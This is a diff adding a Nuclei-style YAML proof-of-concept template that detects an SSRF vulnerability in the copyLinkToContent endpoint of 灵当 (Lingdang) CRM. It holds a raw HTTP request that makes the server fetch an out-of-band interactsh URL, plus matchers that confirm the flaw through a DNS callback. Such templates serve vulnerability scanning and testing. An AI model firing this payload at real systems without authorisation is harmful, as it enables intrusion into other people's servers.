@@ -1,0 +1,24 @@
+id: poc-yaml-51mis-crm-copylinktocontent-ssrf
+info:
+  name: 灵当CRM copyLinkToContent SSRF漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: ssrf
+http:
+  - raw:
+      - |
+        GET /crm/WeiXinApp/marketing/index.php?module=Articles&action=copyLinkToContent&url=https://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "文章不存在"
+        part: body
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
